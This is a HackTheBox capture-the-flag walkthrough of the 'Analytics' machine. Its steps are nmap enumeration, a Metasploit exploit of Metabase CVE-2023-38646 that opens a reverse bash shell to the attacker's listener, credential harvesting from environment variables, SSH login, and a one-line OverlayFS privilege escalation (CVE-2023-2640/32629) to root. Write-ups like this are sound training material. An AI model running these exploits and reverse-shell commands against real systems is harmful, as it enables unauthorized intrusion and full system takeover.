---
categories: [HackTheBox]
tags: [Metasploit, PrivEsc, Public Exploit]  
media_subpath: /Vulnhub-Files/img/
image:
  path: Analytics/Untitled.png
  alt: Analytics Machine 🖥️
---

## Description ⤵️ 

This is a <kbd>*Analytics*</kbd> machine writeup/walkthrough, from HackTheBox platform.
This Machine is vulnerable to Metabase version .

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Analytics]
└─$ sudo nmap -sC -sV -oN Nmap_results.txt 10.10.11.233 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 20:38 IST
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Analytical
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

## Web Enumeration ⤵️

Lets check port 80 and I redirected to `analytical.htb` and I set the hosts file and I got this site →

![Untitled](Analytics/Untitled%201.png)

I also got this Login page → `http://data.analytical.htb/` 

![Untitled](Analytics/Untitled%202.png)

> I then searched related to matabase and I encountered with this vulnerability → [**CVE-2023-38646**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38646)
{: .prompt-tip }

I used it with metasploit like this →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Analytics]
└─$ msfconsole -q     
msf6 > search metabase

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE

Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/metabase_setup_token_rce) > options

Module options (exploit/linux/http/metabase_setup_token_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usin
                                         g-metasploit.html
   RPORT      3000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI of the Metabase Application
   VHOST                       no        HTTP server virtual host

Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.

msf6 exploit(linux/http/metabase_setup_token_rce) > set RHOSTS data.analytical.htb
RHOSTS => data.analytics.htb
msf6 exploit(linux/http/metabase_setup_token_rce) > set RPORT 80
RPORT => 80
msf6 exploit(linux/http/metabase_setup_token_rce) > set LHOST tun0
LHOST => 10.10.14.193
msf6 exploit(linux/http/metabase_setup_token_rce) > run

[*] Started reverse TCP handler on 10.10.14.193:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 0.46.6
[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[*] Sending exploit (may take a few seconds)
[*] Command shell session 1 opened (10.10.14.193:4444 -> 10.10.11.233:49796) at 2023-10-25 20:37:06 +0530
```
{: .nolineno}

Now I ran the environment variable and got some credentials from it →

```bash
/bin/bash -i
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
b279cd18d8ff:/$
b279cd18d8ff:/$ whoami
whoami
metabase
b279cd18d8ff:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
b279cd18d8ff:/$
b279cd18d8ff:/$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=b279cd18d8ff
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=6
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/app
b279cd18d8ff:/$
```
{: .nolineno}

Now lets have a shell for metanalytics →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Analytics]
└─$ ssh metalytics@10.10.11.233
The authenticity of host '10.10.11.233 (10.10.11.233)' can not be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233 is password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 27 01:54:16 PM UTC 2023

  System load:              0.13525390625
  Usage of /:               93.2% of 7.78GB
  Memory usage:             32%
  Swap usage:               0%
  Processes:                160
  Users logged in:          1
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:300c

  => / is using 93.2% of 7.78GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Oct 27 13:45:02 2023 from 10.10.14.171
metalytics@analytics:~$ whoami
metalytics
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ sudo -l
[sudo] password for metalytics: 
Sorry, user metalytics may not run sudo on localhost.
metalytics@analytics:~$ ls -al
total 40
drwxr-x--- 5 metalytics metalytics 4096 Oct 27 13:47 .
drwxr-xr-x 3 root       root       4096 Aug  8 11:37 ..
lrwxrwxrwx 1 root       root          9 Aug  3 16:23 .bash_history -> /dev/null
-rw-r--r-- 1 metalytics metalytics  220 Aug  3 08:53 .bash_logout
-rw-r--r-- 1 metalytics metalytics 3771 Aug  3 08:53 .bashrc
drwx------ 2 metalytics metalytics 4096 Aug  8 11:37 .cache
drwx------ 3 metalytics metalytics 4096 Oct 27 13:47 .gnupg
drwxrwxr-x 3 metalytics metalytics 4096 Aug  8 11:37 .local
-rw-r--r-- 1 metalytics metalytics  807 Aug  3 08:53 .profile
-rw-r----- 1 root       metalytics   33 Oct 27 13:42 user.txt
-rw-r--r-- 1 metalytics metalytics   39 Aug  8 11:30 .vimrc
metalytics@analytics:~$ cat user.txt
b4fcaf112c5bd2fae24cb1c1a8b9a62d
metalytics@analytics:~$
```
{: .nolineno}

I searched on web realted to OS version exploit and I got this →

```bash
metalytics@analytics:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.3 LTS"
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
metalytics@analytics:~$
```
{: .nolineno}

I found 2 CVEs that are **CVE-2023-2640 and CVE-2023-32629** and its details where I tried this exploit :

[https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)

Lets try this exploit →

```bash
metalytics@analytics:/tmp$ unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
root@analytics:/tmp# whoami
root
root@analytics:/tmp# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
root@analytics:/tmp# cd /root
root@analytics:/root# ls -al
total 48
drwx------  6 root root 4096 Aug 25 15:14 .
drwxr-xr-x 18 root root 4096 Aug  8 11:37 ..
lrwxrwxrwx  1 root root    9 Apr 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Oct 27 14:11 root.txt
drwxr-xr-x  2 root root 4096 Aug 25 15:14 .scripts
-rw-r--r--  1 root root   66 Aug 25 15:14 .selected_editor
drwx------  2 root root 4096 Apr 27  2023 .ssh
-rw-r--r--  1 root root   39 Aug  8 11:30 .vimrc
-rw-r--r--  1 root root  165 Aug  8 11:53 .wget-hsts
root@analytics:/root# car root.txt
Command 'car' not found, but can be installed with:
apt install ucommon-utils
root@analytics:/root# cat root.txt
e89e3986fc936ccca2d00116ce214656
root@analytics:/root#
```
{: .nolineno}

I am root now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }